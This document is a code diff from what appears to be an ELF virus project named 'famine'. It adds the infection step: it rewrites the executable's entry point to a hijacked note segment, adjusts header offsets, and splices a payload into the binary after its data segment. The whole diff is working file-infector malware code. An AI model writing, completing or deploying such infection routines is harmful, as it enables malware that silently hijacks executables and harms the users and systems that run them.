@@ -17,9 +17,6 @@ void update_note_segment(t_famine *famine)
     const size_t base = famine->p_data.p_vaddr + famine->p_data.p_memsz;
     const size_t add_padding = base % famine->p_data.p_align;
 
-    printf("padding = %li\n", add_padding);
-    exit(1);
-
     famine->p_note.p_vaddr = base + (famine->p_data.p_align - add_padding);
     famine->p_note.p_paddr = famine->p_note.p_vaddr;
     famine->p_note.p_offset = base - add_padding;
@@ -53,6 +50,7 @@ void pt_note_to_pt_load_infection(t_famine *famine)
         {
             p_data_found = true;
             famine->p_data = segment;
+            famine->p_data_end_offset = famine->p_data.p_offset + famine->p_data.p_filesz;
         }
         if (is_note_segment(segment) == true)
         {
@@ -65,8 +63,17 @@ void pt_note_to_pt_load_infection(t_famine *famine)
     {
         error(ERROR_SECTION_NOT_FOUND, famine);
     }
+
+    famine->ehdr->e_entry = famine->p_note.p_vaddr;
+    famine->new_entry_point = famine->ehdr->e_entry;
+
+    famine->ehdr->e_shoff += famine->payload_size + (famine->p_note.p_offset - famine->p_data_end_offset);
     update_note_segment(famine);
 
-    // Copy until end of original file.
-    memcpy(famine->infected_file, famine->mmap_ptr, famine->binary_data_size);
+    // Copy until end of data section.
+    memcpy(famine->infected_file, famine->mmap_ptr, famine->p_data_end_offset);
+    // Copy payload.
+    memcpy(famine->infected_file + famine->p_data_end_offset, famine->payload_data, famine->payload_size);
+    // Copy the rest of the binary.
+    memcpy(famine->infected_file + famine->p_data_end_offset + famine->payload_size, famine->mmap_ptr + famine->p_data_end_offset, famine->binary_data_size - famine->p_data_end_offset);
 }
